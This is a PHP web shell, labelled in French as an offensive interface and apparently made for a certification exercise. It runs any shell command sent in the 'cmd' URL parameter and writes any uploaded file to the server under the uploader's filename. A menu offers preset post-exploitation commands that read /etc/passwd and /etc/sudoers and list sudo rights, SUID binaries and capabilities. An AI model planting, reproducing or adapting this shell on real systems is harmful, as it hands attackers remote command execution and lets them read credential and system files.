<?php
// --- Command Execution ---
$output = "";
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
}

// --- File Upload ---
$upload_status = "";
if (isset($_POST['upload'])) {
    if (move_uploaded_file($_FILES['fichier']['tmp_name'], $_FILES['fichier']['name'])) {
        $upload_status = "✅ Fichier {$_FILES['fichier']['name']} uploadé avec succès !";
    } else {
        $upload_status = "❌ Erreur lors de l'upload";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>WebShell Avancé - IT4U</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #00ffcc;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        h1, h2 {
            color: #00ffff;
        }
        input[type="text"], select, input[type="file"] {
            background-color: #2a2a3b;
            border: 1px solid #00ffcc;
            color: #00ffcc;
            padding: 8px;
            width: 70%;
            margin-bottom: 10px;
        }
        input[type="submit"], button {
            background-color: #00ffcc;
            color: #1e1e2f;
            border: none;
            padding: 8px 12px;
            margin-right: 10px;
            cursor: pointer;
        }
        textarea {
            background-color: #111;
            color: #0f0;
            width: 100%;
            height: 300px;
            margin-top: 10px;
        }
        .section {
            border: 1px solid #00ffcc;
            padding: 15px;
            margin-bottom: 20px;
            background-color: #2a2a3b;
        }
        .output {
            white-space: pre-wrap;
            background-color: #000;
            padding: 10px;
            margin-top: 10px;
            color: #0f0;
            border: 1px dashed #00ffcc;
        }
    </style>
</head>
<body>
    <h1>🛠 WebShell Avancé – Interface Offensive (Niger Certify)</h1>

    <div class="section">
        <h2>💻 Exécution de commande</h2>
        <form method="get">
            <input type="text" name="cmd" placeholder="Ex: whoami; uname -a" autofocus />
            <input type="submit" value="Exécuter" />
        </form>
        <?php if (!empty($output)) echo "<div class='output'><strong>Résultat :</strong><br><pre>$output</pre></div>"; ?>
    </div>

    <div class="section">
        <h2>🧱 Post-Exploitation / Privesc</h2>
        <form method="get">
            <select name="cmd">
                <option value="id">Afficher ID utilisateur</option>
                <option value="uname -a">Infos kernel</option>
                <option value="sudo -l">Sudo disponibles</option>
                <option value="cat /etc/passwd">/etc/passwd</option>
                <option value="find / -perm -4000 2>/dev/null">SUID binaries</option>
                <option value="find / -type f -name '*.sh' 2>/dev/null">Fichiers .sh trouvables</option>
                <option value="ls -la /etc/cron.*">Tâches cron</option>
                <option value="getcap -r / 2>/dev/null">Capabilities</option>
                <option value="cat /etc/sudoers">Sudoers (si permis)</option>
            </select>
            <input type="submit" value="Analyser" />
        </form>
    </div>

    <div class="section">
        <h2>📁 Navigation rapide</h2>
        <form method="get">
            <input type="text" name="cmd" value="ls -la" />
            <input type="submit" value="Lister" />
        </form>
    </div>

    <div class="section">
        <h2>📥 Uploader un fichier</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fichier">
            <input type="submit" name="upload" value="Uploader">
        </form>
        <p><?= $upload_status ?></p>
    </div>
</body>
</html>
